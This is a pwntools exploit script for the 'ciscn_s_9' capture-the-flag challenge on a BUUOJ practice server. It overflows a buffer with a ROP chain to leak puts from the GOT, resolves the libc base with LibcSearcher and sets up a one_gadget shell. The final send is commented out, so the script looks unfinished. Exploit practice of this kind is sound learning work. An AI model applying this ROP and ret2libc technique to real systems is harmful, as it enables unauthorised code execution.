from pwn import *
from LibcSearcher import *

# p=process('./ciscn_s_9')
p=remote('node4.buuoj.cn',29656)
elf=ELF('./ciscn_s_9')
# libc=ELF('/home/cc/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/libc-2.27.so')
p.recvuntil(b'>\n')
context.arch='i386'
context.log_level='debug'
bss=elf.bss()+0x100
print("bss:",hex(bss))
# gdb.attach(p)
# pause()
hint_addr=0x08048551
pwn_addr=0x080484BB
pop_ebp=0x08048557
pop_ebx=0x08048359
pop_edi_ebp=0x080485da
jmp_esp=0x08048554
leave_ret=0x08048428
__libc_start_main_got=0x804a018
fflush_got=elf.got['fflush']
puts_got=elf.got['puts']
fgets_got=elf.got['fgets']
puts_plt=elf.plt['puts']
_libc_start_main_got=elf.got['__libc_start_main']
# payload=asm('''
#             pop edi
#             pop edi
#             pop edi
#             ''')
payload=b'bbb'
payload+=(32-len(payload))*b'a'
payload+=flat([__libc_start_main_got+0x18,puts_plt,0x080484EE,puts_got])
# payload+=p32(0xffff000)
# payload+=p32(hint_addr)
# gdb.attach(p)
# pause()
p.sendline(payload)
context.log_level='debug'

# p.interactive()
p.recvuntil(b'OK bye~\n')
puts=u32(p.recv(4))
# fgets=0
# fgets=u32(p.recv(4))
print("puts:",hex(puts))
# print("fgets:",hex(fgets))
libc=LibcSearcher('puts',puts)
# libc.add_condition('fgets',fgets)
libc_base=puts-libc.dump('puts')
print("libc_base:",hex(libc_base))
one_gadget=libc_base+0x3d2a3
# gdb.attach(p,'b *0x804854f')
# pause()
p.recvuntil(b'>\n')
payload2=flat([one_gadget,one_gadget,one_gadget,one_gadget])
# p.sendline(payload2)
p.interactive()
